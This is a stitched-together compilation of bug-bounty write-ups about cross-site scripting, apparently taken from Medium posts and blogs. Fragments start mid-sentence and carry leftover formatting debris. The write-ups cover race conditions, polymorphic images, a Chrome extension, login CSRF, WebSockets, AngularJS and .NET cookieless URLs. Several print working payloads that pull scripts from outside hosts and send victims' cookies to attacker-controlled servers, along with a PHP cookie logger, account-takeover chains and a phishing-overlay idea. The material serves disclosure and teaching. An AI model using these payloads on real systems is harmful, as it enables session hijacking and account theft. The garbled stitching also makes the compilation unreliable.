As you asked for on twitter (make sure to follow me @D aherMohamed4 ) Here is how I was able to escalate this bug from P5 to P2 and got rewarded +1000$. So let’s start. It was the same private program as my last write up. So I’ve been hunting on this program for a week already and already reported all my findings so I was struggling to find any more bug. But not seeing them doesn’t mean they don’t exist :) So I decided to start over and create a new account. When I filled all the details, they asked me to verify my email first but I could also change the email to another one in case I made a mistake. I directly thought about Race-Condition to use any email without verifying it. Here’s how you can do it (we’ll assume that we have access to lasok@dot-coin.com and we want to register with aa@aa.com) 1/ Add an email to the account and open the email with the verification link but don’t click on it yet (In my case I added lasok@dot-coin.com and opened the mail they sent me) 2/ On the website click on “change email”. Change the email to the one you want to use without verification but don’t click on send link now. (Now I changed the email to aa@aa.com) lasok@dot-coin.com is a temp email Here comes the tricky part. You have to click on the verification link and change your email at the same time. You can do that without burp but you may have to try a few times before it works so here is a method to make it work every time: Start burp and turn intercept on Now open the verification link you received on lasok@dot-coin.com then switch tab and validate the new email on the website (aa@aa.com) then turn intercept off. Burp will forward the 2 requests together and that’s what we want. Press enter or click to view image in full size Press enter or click to view image in full size aa@aa.com was verified and I could now login to my account. In this case what you should do is to register with email@company.com, sometimes you can get access to some cool admin features. But unfortunately for me it wasn’t the case here but I still reported it and as expected, closed as P5. Press enter or click to view image in full size Thanks Roy But huh who are we to give up ? Now we have to escalate this to give a valid impact in order to be a valid bug. After some minutes I tried to escalate this to XSS. Did the same process but instead of entering a fake email in the second step I entered : <svg/onload=alert(1)> and XSS triggered. But since my email is private and only me can see it, this is a Self-XSS. So we went from Race-Condition (P5) to Self-XSS (P5). Now, what ? I remembered that this private program also had a forum dedicated to their site. I did the same process again but instead of entering a regular XSS payload I entered a Blind XSS payload. Mine was : “></script><script src=//m0m0x01d.xss.ht></script> (Tip : Use xsshunter.com tool to find blind xss) I then went to the forum, created a new weird thread (to be sure that the admin will delete it) and reported my own thread to be sure that the admins see it. Within hours I got an email alerting me that someone triggered my XSS. Reading the XSSHunter report : Triggered at : https://www.company.com/profile/XXXX Referer : https://forums.company.com/XX/index.php?/topic/123456--/ The admin saw my weird thread, then he clicked on my username → redirected to my profile → XSS triggered The reason why it triggered was that the admins had the feature to see the email of any user only by visiting their profile. I now had the session cookie of the admin and I could use it to get access to the internal panel. I directly opened a new report on Bugcrowd and some days later : Press enter or click to view image in full size So that’s how I went from a P5 Race Condition to a P5 Self XSS to a P2 Blind XSS. Hope you guys learnt something new from this write up and if you have any question about this hit me up on twitter @DaherMohamed4 I will try to reply when I’m free. Take-away : 1/ If you’r able to use any email without verification, try registering with email@domain.com you may get access to some admin features 2/ Always look for the highest severity. Here if the program accepted the bug as P4 I would get 100$ for that instead of 10x the bounty for the XSS 3/ When you find a P5 bug you may use it and chain it with another bug to increase the severity (tip 2), they are not always useless Bug Bounty Infosec Hacking Web Security -- -- 4 Written by Mohamed Daher 458 followers · 0 following Hey Responses ( 4 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}

Multiple screens of the web application were fetched and rendered using a combination of location.hash parameters and XHR to retrieve the supposed templating snippets from a relative URI, rendering them on the page unescaped. This is not dangerous per se, unless the platform lets users upload arbitrary content and serve it from the same origin, which unfortunately Google Scholar does, given its image upload functionality. While any penetration tester worth her salt would deem the exploitation of the issue trivial, Scholarâs image processing backend was applying different transformations to the uploaded images (i.e. stripping metadata and reprocessing the picture). When reporting the vulnerability, Googleâs VRP team did not consider the upload of a polymorphic image carrying a valid XSS payload possible, and instead requested a PoC||GTFO. Given the age of this technique, I first went through all past âwell-knownâ techniques to generate polymorphic pictures, and then developed a test suite to investigate the behavior of some of the most popular libraries for image processing (i.e. Imagemagick, GraphicsMagick, Libvips). This effort led to the discovery of some interesting caveats. Some of these methods can also be used to conceal web shells or Javascript content to bypass âselfâ CSP directives . Payload in EXIF The easiest approach is to embed our payload in the metadata of the image. In the case of JPEG/JFIF, these pieces of metadata are stored in application-specific markers (called APPX ), but they are not taken into account by the majority of image libraries. Exiftool is a popular tool to edit those entries, but you may find that in some cases the characters will get entity-escaped, so I resorted to inserting them manually. In the hope of Googleâs Scholar preserving some whitelisted EXIFs, I created an image having 1.2k common EXIF tags, including CIPA standard and non-standard tags. While that didnât work in my case, some of the EXIF entries are to this day kept in many popular web platforms. In most of the image libraries tested, PNG metadata is always kept when converting from PNG to PNG, while they are always lost from PNG to JPG. Payload concatenated at the end of the image (after 0xFFD9 for JPGs or IEND for PNGs) This technique will only work if no transformations are performed on the uploaded image, since only the image content is processed. As the name suggests, the trick involves appending the JavaScript payload at the end of the image format. Payload in PNGâs iDAT In PNGs, the iDAT chunk stores the pixel information. Depending on the transformations applied, you may be able to directly insert your raw payload in the iDAT chunks or you may try to bypass the resize and re-sampling operations. Googleâs Scholar only generated JPG pictures so I could not leverage this technique. Payload in JPGâs ECS In the JFIF standard, the entropy-coded data segment (ECS) contains the output of the raw Huffman-compressed bitstream which represents the Minimum Coded Unit (MCU) that comprises the image data. In theory, it is possible to position our payload in this segment, but there are no guarantees that our payload will survive the transformation applied by the image library on the server. Creating a JPG image resistant to the transformations caused by the library was a process of trial and error. As a starting point I crafted a âbaseâ image with the same quality factors as the images resulting from the conversion. For this I ended up using this image having 0-length-string EXIFs. Even though having the payload positioned at a variable offset from the beginning of the section did not work, I found that when processed by Google Scholar the first bytes of the imageâs ECS section were kept if separated by a pattern of 0x00 and 0x14 bytes. From here it took me a little time to find the right sequence of bytes allowing the payload to survive the transformation, since the majority of user agents were not tolerating low-value bytes in the script tag definition of the page. For anyone interested, we have made available the images embedding the onclick and mouseover events. Our image library test suite is available on Github as doyensec/StandardizedImageProcessingTest .

Here’s the full content:\n\nNetlifx Party - Two Severe XSS Vulnerabilities | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Netflix Party — XSS Vulnerabilities kr-b 4 min read · Apr 14, 2020 -- Listen Share https://netflixparty.com Chrome extension that lets you watch Netflix shows and movies with your friends. User nickname Discovery One late night playing some World of Warcraft, my friend and I decided we wanted to watch a Netflix show together, so we went ahead and installed the new Netflix Party Chrome add-on that is all over the news and social media. We start up a party, and out of curiosity I start looking around to see what we can do with this, and I spot a set user nickname field.. So just as a shot in the dark I thought why not just try it? I set my name as <script>alert(1)</script> I get nothing… Then I pause the video and a popup appears! Whenever I paused/played the video, sent a message, joined or left a party, it would write my nickname to the chat bar on the right and execute the JavaScript on all members of the party. Vulnerability After looking around at the JavaScript of the extension, I spot the vulnerable code in the addMessage() function: Unfiltered user input being inserted into HTML The developers were clever enough to escape the input string for message variable however, the userNickname variable was inserted into the HTML without any filtering, thus creating the XSS vulnerability as any HTML tags will be parsed by the browser. Exploits An XSS vulnerability allows an attacker to inject HTML and also execute arbitrary JavaScript. Here are a few examples of possible attacks I could think of. Change chat history Starting with a fun, harmless one. You can change the messages and usernames of all the party member with the below payload by setting it as your nickname. Users exchange messages (just me right now 😢 very lonely) After changing nickname to payload, all the messages are changed Convincing phishing attack This can also lead to a more severe attack. By setting your nickname to the below payload, a full screen iframe will be created on the page, covering it, containing the attacker’s webpage which can contain a fake Netflix login page saying for example “Your session has expired, Please Login again”, the credentials will then get sent to the attacker. All this will happen without the victims ever leaving netflix.com. Fix I reported the vulnerability to the developers, after a couple days with no response I chased them up and they fixed it within 1 week. Fixed code in version 1.7.7 where the userNickname variable is also escaped. XSS Vulnerability — User Icon Discovery After reviewing the fix for the previous bug, I stumbled upon something else, that I’m surprised I didn’t notice before, maybe I was too preoccupied playing with the first thing I found (good tip, look for the same vulnerability). There was another use input field which I forgot about, the user icon. Vulnerability Users can’t change their icons by uploading files however, they choose an icon from a list of files stored locally by the extension. This code below then prints that to the page This value is created with chrome.runtime.getURL('img/' + newicon) and newIcon can’t be edited directly from the extension, but the value is stored in and fetched from Chrome’s local storage, which can be edited! The $userIcon variable is not filtered, so a simple payload like this would work: x\" onerror=alert(1) // which turns into <img src=\"chrome-extension://.../img/x\" onerror=\"alert(1)\"> // this can be stored by (while in context of NetflixParty) chrome.storage.local.set({\"userIcon\": 'x\" onerror=alert(1)'}); Press enter or click to view image in full size User can then join any party or have members join their party, and the JavaScript will be executed instantly Exploits The exploits possible with this are exactly the same as the previous examples but they just need to be tweaked a little bit and not be within <script> tags but part of the onerror function. Fix I then reported this bug, and chased them up a couple times over a few weeks but still no response. So I thought giving this to the hacker community might make them notice :\\ Conclusion As this is a very trending and popular extension, with it being promoted by big media outlets and at time of writing, has over 8 million downloads, it’s quite important to also consider the security aspects when building such an application. Although the vulnerability here doesn’t impact the developer’s assets such as their own servers or any stored information on their side, this does put their users at risk Extra Info Just out of curiosity and wanting to practice some programming, I reverse engineered the application and wrote a full exploit tool for this in Python as the application is using unprotected/unauthenticated web sockets (another vulnerability for another time) anyone that has the details of a Netflix Party (npSessionId, npServerId) can talk to the server and interact with it. This means that an attacker can exploit the above mentioned XSS without even needing a Netflix account, they just join a session by providing the payload in the JSON parameter of the request.

From Self-XSS to Persistent XSS on Login Portal | by Nnez | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Always escalate! From Self-XSS to Persistent XSS on Login Portal Nnez 4 min read · Apr 2, 2020 -- 2 Listen Share Press enter or click to view image in full size Ref https://upload.wikimedia.org/wikipedia/commons/4/42/Copenhagen_Metro_escalators.jpg About 2 months ago, I discovered a persistent self-XSS on a login portal. Most of programs do not accept self-XSS report, but I managed to escalate this to persistent XSS on login page by chaining with Login CSRF and reported to the program as valid vulnerability. Yet again, this is my discovery on private program, so let’s call it redacted.com There was an account portal page where you could change some settings on your account including firstname, lastname. I spent some time tampering with all the parameters that I was able to. The result was I found that there was no validation of firstname and lastname on the backend, meaning I could change my name to something like <em>John</em> . However, <script> tag or common XSS payload were not allowed because there was cloudflare in-between frontend and backend and the reflected name on account page was filtered as well. < was escaped to &lt; . I stopped looking for bugs on this account portal page thinking that it was too hardening for me. Few days later, I was willing to try again and got their login page on my browser but I noticed something strange before typing my credentials on the form. I was greeting with the name I changed last time, John but that HTML tag <em> was missing. I pressed CTRL+U on my keyboard, to bring source code of this page up to my screen and there was that HTML tag enclosing the name! unfiltered. I went on researching on how to bypass cloudflare WAF, there were many articles out there on the Internet but the core idea is to look for an origin IP of the server. An easiest and simple way is to look for IP history on viewdns.org. If the website was initially set up without cloudflare, an origin IP would be logged on the Internet history. Lucky me, I found an origin IP recorded on viewdns.org. I tried accessing the website from its origin IP and changed the name to <script>alert(\\”Are you hungry?\\”)</script> , it got pass to the backend with no cloudflare WAF involved. As expected, alert box prompted when I visited login page. So I found self-XSS on login page, then what? Most programs do not accept this type of vulnerability report becauuse it usually does not pose security threat but I spent too much time on this, there was no way back. The only was to go up! (I mean escalate) When you find a self-XSS (that’s not putting javascipt code in dev console), ALWAYS try chaining it with other vulnerabilities. There are many articles out there from many great minds writing about escalating self-XSS. One that might relate to my situation is Login CSRF plus self-XSS Let’s see how does my payload was stored on login page. 1.) After login, if user check on Remember me box, session will be saved in cookies named rememberme, with expiration time set to one year. 2.) If a user visit login page again, even without logging out before, he/she will be greeting with firstname reflected on login page. Therefore, if I manage to find login CSRF, I could force other users to login on my account and if they visit the login page again, my XSS payload will be executed. I started by Burp Suite to get a look at login request and as expected, CSRF token was sent along with my credentials during login request. I tried removing that token and re-sent the request… Unforetunately, it failed. As I said, I could not give up. Have you ever heard of poor man CSRF?. Usually, to implement anti-CSRF system, the CSRF token need to be tied to something that can be used to identify the person who perform that action. If CSRF token does not tie to user’s session, an attacker could grab a valid CSRF token from the website and reuse it on victim. I tried this option, copying CSRF token from a different browser session and reuse it… I got login to my account! I finally found a way to force XSS on user login page. Here is the proof-of-concept code I used to exploit this chain of vulnerabilities <?php $html = file_get_contents(' https://redacted.com/login' ); preg_match('/name\\=\\”CSRF_TOKEN\\” value\\=\\”(.*?)\\”\\', $html, $match); if( count ($match) ){ $token = $match[1]; echo ' <form name=”loginForm” target=”_blank”> <!-— form that contains my credentials + grabbed CSRF token --> </form> <script> window.forms.loginForm.submit(); </script> '; } ?> If a user visit my page, he/she will be forced to log into my account and next visit on login page, he/she will be greeting with my XSS payload!

So first of all what is WebSocket? WebSockets allow the client/server to create a 'full-duplex' (two-way) communication channels, allowing the client and server to truly communicate asynchronously, simply both client/server can send and receive messages. So unlike some API endpoints where developers strictly check the Origin Header value, but here in WebSocket case they mostly ignore it, which in result allows any arbitrary Origin to make a connection to the WebSocket instance of the Web App. The format of a WebSocket URL is like this, wss://readact.com, here wss:// is used for a secure SSL connection like https:// some web apps also uses ws:// which is like http:// Now we will look for some places where we can find the WebSocket URL or endpoint. The handiest and easiest way to find WebSocket endpoint is the BurpSuite WebSockets history tab. BurpSuite > Proxy > WebSockets history There you will see all the history of WebSockets requests. The other place where you can look for WebSocket endpoint is the Network tab of your Browser Developer Tool. If WebSocket connection request is sent to the server you will find it there. Now the Place where there is a 99% chance of finding the WebSocket endpoint if the WebApp is using WebSocket is the JavaScript files or the page source of the WebApp, Search for these keywords in the JavaScript file. wss:// ws:// websocket Now after finding the WebSocket endpoint, we have to check if the endpoint is accepting the connection from other Origins . For this simply head to https://www.websocket.org/echo.html and in the Location textbox enter the WebSocket URL/endpoint . Click on the Connect button in the Log box you will get the response, if the connection was successful it will print Connected or if the connection fails it will print DISCONNECTED. You can also check the connection with BurpSuite. From the Burp Repeater send the Request with your Origin in the Origin Header value . If the server responds with a status code of 101 and your specified Origin is reflected OR if you see an * in the Origin header in the response this means that the connection was successful. Now let’s take a look at a Real-World Webapp scenario, I was hunting a private program so when I was inspecting the source code of the dashboard page of the domain, I came across this piece of code. var wsUri = ‘wss://ex.target.com//ex-new/portal/websocket’; var ws = new WebSocket(wsUri); This confirms that the web app was using WebSocket, now I had to confirm that it accepts connections from other domains too. there are many ways to confirm it which I have also mentioned above, for this case, I just open up a new tab and in from the console I executed this code. var wsUri = ‘wss://ex.target.com//ex-new/portal/websocket’; var ws = new WebSocket(wsUri); ws.onopen = function(e) { console.log(e); } The connection was established and I got the response in the console. Press enter or click to view image in full size So now I can send data to the server and can also receive data from the server. building a (Two-way Communication). Now I set up a listener to listen for incoming and outgoing communication from the server. But there wasn’t anything confidential to listen for. ws.onmessage = function(e) { console.log(e.data); } So now I tried to send a message to the server and was curious that how the server will handle it on the client-side. ws.send(“hello you are vulnerable”); But there was no reflection of the message in the client-side source code. After reading the JS files of the web app, I found a function which was handling the message received from the WebSocket, The data received from the server was being checked in a conditional statement , ws.onmessage = function(e) { if (e.data.indexOf(“||”) > 0) { var messs = e.data.split(“||”); let alertId = messs[0]; var type = messs[1]; let alertDom = messagee(alertId); } } So the data returned by the server must have || in between. and if the condition fulfilled then the data was rendered in the HTML of the page inside a tag. So to confirm that the data is placed inside the tag I sent a message to the server from my connected instance of WebSocket. ws.onopen = function(e) { ws.send(\"hello||you are vulnerable\"); }; Press enter or click to view image in full size and it worked :) Now to perform an XSS I just had to break out of the <a> tag, for this I wrote this code. <script language=”javascript” type=”text/javascript”> var wsUri = ‘wss://ex.target.com//ex-new/portal/websocket’; var ws = new WebSocket(wsUri); ws.onopen = function(e){ console.log(e); var a = `”><script>alert(‘XSS’)<\\/script>||leetwa`; ws.send(a); } ws.onmessage = function (evt){ var received_msg = evt.data; console.log(evt.data); } ws.onclose = function(a){ console.log(a);} </script> There I got XSS on all the pages of the web app which were using WebSockets , similarly, I was able to perform CSRF attacks on all the pages using WebSockets and was able to modify the Content of the pages which were using WebSockets making the XSS, CSRF, Content Injection Application wide. Performing a malicious request to change victim email. ws.onopen = function(e) { console.log(e); const payload = `(function(){ const $ = e => document.querySelector(e); $(“#lastName”).value = “Hacked”; $(“#firstName”).value = “Account”; `$(“#company”).value = “Bad Company”; $(“#jobTitle”).value = “Hacker”; $(“#email”).value = “cyber.spidey@hacked.com”; $(“.btn-primary”).click(); `})();` var a = `”><script>${payload}<\\/script>||leetwa` ws.send(a); `}; I hosted this code on my webserver and I just had to send it to the victim and there you go, victim email will be changed or the XSS will execute on all of the pages of the web app. or else I could have changed the HTML of all the open pages by this code. ws.onopen = function(e) { console.log(e); const payload = “<center><h1>You have been Hacked</h1><br> <br><h1>Contact here: <a href=’https://evil.com'>Evil.com</a></h1></center>\" var a = `”><script>document.querySelector(“body”).innerHTML = “${payload}”<\\/script>||leetwa` `ws.send(a); }; That’s it Thank you for reading, the bug was accepted as a P1.

Exploiting Self Stored XSS to escalate… | by Ch3ckM4te | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Self XSS to Account Takeover Ch3ckM4te 6 min read · Mar 24, 2020 -- 1 Listen Share Hello everyone, this is my first blog. I came across this topic while searching ways to escalate one of my finding for self XSS in a bug bounty program. Self XSS to Account Takeover After hours of reading blogs and medium articles, I came to know about few techniques or should I say few ways to chain multiple low level bugs that can lead to account takeover. I decided to not limit myself by just reading the blogs but to actually implement what I’ve learnt. I already have the bug bounty program on which I have a finding of stored self XSS but after reading the escalation steps, I found it to be secure from other necessary low level bugs that were needed for escalation. So, I decided to just practically try the method of chaining for escalation, hence created my own environment, a simple web application which demonstrates a set of vulnerabilities which are often considered out-of-scope, NA, P5 or just informational findings. TL,DR; -> I chained Stored Self XSS with Login/Logout CSRF and leveraged oAuth login functionality to steal user cookies -> Scroll to the bottom to find POC video as well as complete code for the setup and exploit Necessities: Stored Self XSS Login and Logout CSRF Functionality of traditional login as well as oAuth implementation Environment Setup This web application has a login page which provides two functionalities: Login with Email ID/Password Login with Google On logging into the account, if done with first method, it will fetch in some default values to be displayed in name, description etc. and on logging in with second method, it will fetch account details from Google account and display it on dashboard. The dashboard page also have a comment functionality (created just for a sake of demonstrating stored self XSS). Attack Overview: We will create a malicious script on our (attacker) server Embed it into attacker’s account by exploiting stored self XSS Create a page which does following: i. Logs out the victim user using Log out CSRF ii. Login to attacker’s account using Email/Password functionality iii. Execute stored XSS from attacker’s account which in-turn will load the external script (stored on attacker’s server) 4. Now, external script will start its execution in following way: i. Logs out the attacker ii. Login to victim’s account with the help of oAuth implementation iii. Steal victim cookies & send it to attacker’s server Detailed Explanation: Step 1 We will create a malicious JavaScript file on our (attacker) server. Suppose its evil.js Later in this article, we’ll look in detail for what to write in evil.js but for the meantime lets proceed with our attack. Step 2 We know that comment functionality of dashboard is vulnerable to self-stored XSS. So use the following code to embed external JavaScript file. <script src=http://attacker.com/evil.js></script> This code will load the external JavaScript file from attacker’s server and browser will start its execution. Step 3 (i) Logs out the victim user using Log out CSRF On analysis of web application’s log out functionality (just looking to the logout request :P), we can see its simply making a GET request on logout.php to destroy cookies. So, we will use img tag to hit to the log out page which will destroy victim’s cookies. <img src=http://localhost/app/logout.php> This code will try to fetch the image from the specified source and while doing so, it will make a GET request to the source URL which by our application’s logic, logs-out the user. (ii) Login to attacker’s account using Email/Password functionality As the web application has feature to login with email ID/password also, we will write a simple JavaScript code to send POST request to the URL with our credentials, after which attacker’s session will gets activated. Code for logging in to attacker’s account: navigator.sendBeacon(“http://localhost/GoogleLogin/authLocal.php\", new Blob([“username=admin&password=admin”], { type: “application/x-www-form-urlencoded” })) JavaScript has a very useful method navigator.sendBeacon() which can be used to send POST request with some very specific content types. It simply takes the URL to visit along with the data and content type. Read more about it here . Please note that we can also make invisible HTML form and send it using JavaScript to perform this action, sendBeacon just gives us a simple and much powerful method to use. (iii) Execute stored XSS from attacker’s account Now that we are logged in as attacker, we will redirect the victim to the page which executes our stored XSS (generally dashboard or edit_profile page). Once JavaScript executes, it will load up the external JavaScript file and start its execution. Step 4 Now, we have come to the point where we will see what the external JavaScript file (evil.js) will do. (i) Logs out the attacker: As we have seen previously, just hit the log out URL with img tag <img src=http://127.0.0.1/app/logout.php> Again, this will try to fetch image from source URL and make a GET request which will log out the user. (ii) Login to victim account with oAuth functionality: This is the critical step of the exploit, we have to carefully analyse the each request from initiation of the authentication process using oAuth till the time we get access to our application and on following each request, we will see a particular request (generally, it will look like /?auth=<some_code> ) which is responsible for authenticating us to our application. Code for logging in to victim’s account (for Google): navigator.sendBeacon(“https://accounts.google.com/o/oauth2/auth?response_type=code&access_type=online&client_id=3195217987-usqr8lj019fd8df2rlihu32gl3qk725r.apps.googleusercontent.com&redirect_uri=http%3A%2F%2Flocalhost%2FGoogleLogin%2Fg-callback.php&state&scope=https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fplus.login%20https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.email&approval_prompt=auto\",\"\"); Here, method navigator.sendBeacon will make a POST request to the specified URL with no POST data. It is important to note that here we are considering a scenario where the victim is already logged in to the Gmail (oAuth Provider) which is usually true in real scenarios. (iii) Steal victim’s cookies We will simply craft a JavaScript payload which will steal victim’s cookie and send it to our server (in this case, to our Burp Collaborator). Now, we have victim’s cookies and then we can proceed to use them and get their session. var link=”http://random.burpcollaborator.net/VictimCookies=\"+document.cookie; navigator.sendBeacon(link,””); This will create a link of Burp’s Collaborator along with cookies of the logged in user and will send them to server using navigator.sendBeacon method. Something more… But generally websites have HttpOnly/Secure flag set on their session cookies, Right? So, in that case, we may use JavaScript to perform some malicious action like email address change adding our mobile number which could later be used in account takeover by password reset functionality. I’ve linked a similar blog post at the last for the references. Few points to be noted regarding my setup: For demonstrating traditional login with email and password, I’ve not setup the complete SQL server. The authLocal.php is the file which contains hard-coded values for credentials If you want to replicate my setup, ensure that you have organisation’s email address and not your personal one. This is because Google doesn’t allow test users to perform oAuth authentication (Sign in with Google) without verification of our web application. Here, I’ve used my college’s email address linked with google. I would also like to admit that the demonstrated case has quite a lot of assumptions and needs to be modified as per situation. This is just a demonstration of what I’ve learned while researching for ways to escalate self stored XSS.

It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nThe Tricky XSS – Smaran Chand Skip to content Smaran Chand Menu Home About Me Search for: February 28, 2020 The Tricky XSS Hello everyone, I would like to share a riveting issue regarding XSS (Cross-Site Scripting ) I endured a few months ago. Cross-site scripting (XSS) is a type of security vulnerability typically found in web applications. XSS enables attackers to inject client-side scripts into web pages viewed by other users. Moving towards the target, It was an online store where a user had to fill his/her address for any specific operations while playing with the textboxes and inputs I feed some random details and saved address nickname with value A<h1>A. And I bet it is very exciting moment for every bug hunters/pentester outta here, my eyes were looking for the “AA” but I was not able to see any reflection on the web page and then I clicked on the delete address button clicking on the button reflected my supplied HTML input with height h5 and h1. By this time I was pretty much sure that there should be an XSS for sure but in reality, while feeding the JavaScript payload I got to know that there is input length validation for 20 chars (including white spaces). Ohh no… You must be thinking, it might be frontend validation only? I tried intercepting and adding the payload in the HTTP request but the server did not accept. Now the main challenge was to find an XSS payload with less than 20 character lengths. I googled and found the XSS payload by Dr. Mario which was <script src=//14.rs> Such a short TLD, domain name and the entire script looked like art. The Javascript payload at index page was '';var msgbox;if(location.hash){eval(location.hash.slice(1))}else{alert(1)}// msgbox+1 Using the same payload at the address nickname gave an XSS alert. And then I thought if it can interact with the DOM and print cookies or not since the used XSS payload or the content was not controlled by myself I thought to create my own shortest XSS payload just to alert the cookies. I planned to get the shortest domain first after a few minutes of googling I choose to get a Punycode domain and purchased one. I got a Punycode domain just to shorten/reduce the length of the payload. A few days back my friend Santosh aka Coded Brain attended Dr. Mario’s workshop at Threatcon 2019 in Kathmandu. He was very interested to share the experience and knowledge gained through. We talked about the issue and planned to exploit in a better way and discuss more. Since I had purchased the Punycode domain it was a bit complex to set up because something was bothering the execution of the code it took us a few minutes to figure out that we were missing just a “=” and trust me it was like a CTF challenge for us, cause we started researching about execution of scripts in SpiderMonkey engine and debugging part by part. The temple of Redbull has nothing to do here… So this was the content on the index page of the server. Thankyou Coded Brain for helping me in this stuff, I didn’t think it would be this easy, although all we did was manual try. Kudos !!! The content in the index page i.e index.html contains alert(document.cookie) in a plain text format. So my final XSS payload became <script src=//ł.rip> Saving the above payload in the address name field gave an XSS alert with cookies. You won’t believe but they considered as a self XSS a P5 and marked as won’t fix. And asked them if we can ask the program owner/developer to see the activity in the backend dashboard but they still said it would be a self XSS issue. Hold on bro… I was really fed up with this and planned to watch if it gets executed in the backend panel/dashboard or not. I could have used XSS hunter payload but the thorn in the way was accepted length of the input data. So I thought to create my own XSS hunter kinda payload for collecting the proof of concept. Here is the minimal code for stealing cookies and sending it to a remote server. document.location='https://ł.rip/save.php?c='+document.cookie; and the source code of save.php file is given below which would save the cookie into a text file. <?php header('Location:https://yourdomain.com'); $cookies = $_GET[\"c\"]; $file = fopen('logs.txt', 'a'); fwrite($file, $cookies . \"\\n\\n\"); ?> All files on the server whenever the script will be executed it will read the cookie from the DOM send to the remote server. Revised payload : <script src=//ł.rip> The cookies will be saved in logs.txt file in the remote server, we can capture mouse movement, keystrokes as well. And then I confirmed the working of the script by executing at my own end and here we go. Biscuits coming to our remote server. Now opening logs.txt, just to confirm the cookies. So yeah!!! Our own XSS hunter !!! Sad part… The sad part of this story is, the XSS never got executed in the shop admin dashboard/backend but I believe I was on the right path, it was worth attempting.

Summary:- Client-side template injection vulnerabilities arise when applications using a client-side template framework dynamically embed user input in web pages. When a web page is rendered, the framework will scan the page for template expressions, and execute any that it encounters. An attacker can exploit this by supplying a malicious template expression that launches a cross-site scripting (XSS) attack. As with normal cross-site scripting, the attacker-supplied code can perform a wide variety of actions, such as stealing the victim’s session token or login credentials, performing arbitrary actions on the victim’s behalf, and logging their keystrokes. Browser cross-site scripting filters are typically unable to detect or prevent client-side template injection attacks. I started my hunting on Microsoft from finding subdomains I got my target site which is https://flow.microsoft.com/ with some advance recon also Here i noted some points like which technology used by that websites Press enter or click to view image in full size Angular templates can contain expressions — JavaScript-like code snippets inside double curly braces. To see how they work have a look at the following jsfiddle: http://jsfiddle.net/2zs2yv7o/ The text input {{7*7}} is evaluated by Angular, which then displays the output: 49. This means anyone able to inject double curly braces can execute Angular expressions. then start sort out the parameters and find out which is “filter” i used xss payload but no payload is working here :( Then i manually checked where it values reflected in sources code then i realize that its by recon and source code reading that it is use a angular template and found a version of that template and search a payload for that here i got that payload Press enter or click to view image in full size then i use Google for it and https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs Press enter or click to view image in full size Video poc:- And Finally, I got Microsoft Hall of Fame. https://portal.msrc.microsoft.com/en-us/security-guidance/researcher-acknowledgments-online-services?rtc=1 Press enter or click to view image in full size Timeline : 13-July-2019 — Report 18-July-2019 — Triaged 28-July-2019 — Valid & Fixed 20-August-2019 — Hall Of Fame Thanks, everyone for reading:) Happy Hacking ;) Support me if you like my work!

Self targeting attacks like this are not considered a security vulnerability as it requires social engineering to target another user.” UPDATE 3/24/2020: Microsoft actually re-assessed the rejected vulnerabilities on 23rd of March and these issues actually do meet their bar for service. Since I am all about responsible disclosure the details are removed until they are patched. “This submission was incorrectly assessed as self-XSS instead of reflected XSS. It was later informed to us that these do meet the bar for service.” With this vulnerability I actually got into Microsoft’s newbie hall of fame on March 2020 section. Lesson learned from this experience is that you should never ever submit reflected XSS to Microsoft without a proper escalation and you can trust me that there was a lot of possibility for that, as described in the article below. Affected domains: activateuat.microsoft.com gallery.technet.microsoft.com ppe.gallery.technet.microsoft.com ppe.code.msdn.microsoft.com What can you do with a reflected XSS? If an attacker can control a script that is executed in the victim’s browser, then they can typically fully compromise that user. Among other things, the attacker can: - Perform any action within the application that the user can perform. - View any information that the user is able to view. - Modify any information that the user is able to modify. - Initiate interactions with other application users, including malicious attacks, that will appear to originate from the initial victim user. What is cross-site scripting (XSS) and how to prevent it? | Web Security Academy In this section, we'll explain what cross-site scripting is, describe the different varieties of cross-site scripting… portswigger.net Finding vulnerabilities: Finding vulnerabilities like these is not hard. I ran the following command: assetfinder -subs-only microsoft.com | httprobe | cookieless assetfinder https://github.com/tomnomnom/assetfinder httprobe https://github.com/tomnomnom/httprobe cookieless https://github.com/RealLinkers/cookieless The last github repository is a tool created by me to automate manual testing process. Hopefully it is useful for other researches as well. What is cookieless and how do you turn that into reflected XSS? Essentially this only works for .NET websites if the developers used a tilde symbol to resolve a resource <script src=”<%= ResolveUrl(“~/Script.js”) %>”></script> The cookieless part of the URL which in the following example is (A(ABCD)) is in no way htmlencoded by design, letting an attacker escape the context of the HTML tag in the following url https://gallery.technet.microsoft.com/(A(ABCD))/ that will translate to <script src=”/(A(ABCD))/Script.js”> Not all characters are supported, but with enough tinkering you can find a way to get the alert to popup. Obviously if you are an attacker you can do much more than an alert as previously described. https://gallery.technet.microsoft.com/(A(%22onerror='alert%601%60'testabcd))/ Since some of these domains don’t even have a Content-Security-Policy you can actually include scripts from 3rd party locations, bypassing the restrictions that you would have defined within the scope of URL length and characters allowed by cookieless identifier. For a much deeper dive into this please refer to this amazing article https://blog.isec.pl/all-is-xss-that-comes-to-the-net/ and Microsoft’s documentation: https://docs.microsoft.com/en-us/dotnet/api/system.web.configuration.sessionstatesection.cookieless?view=netframework-4.8 Disclosure timeline: March 17/2020 Submitted vulnerability to Microsoft MSRC March 19/2020 Public disclosure as deemed not a vulnerability by Microsoft MSRC March 23/2020 Public disclosure hidden since Microsoft MSRC reassessed the vulnerabilities and they do in fact meet their bar for service Issues have been addressed Follow Infosec Write-ups for more such awesome write-ups.

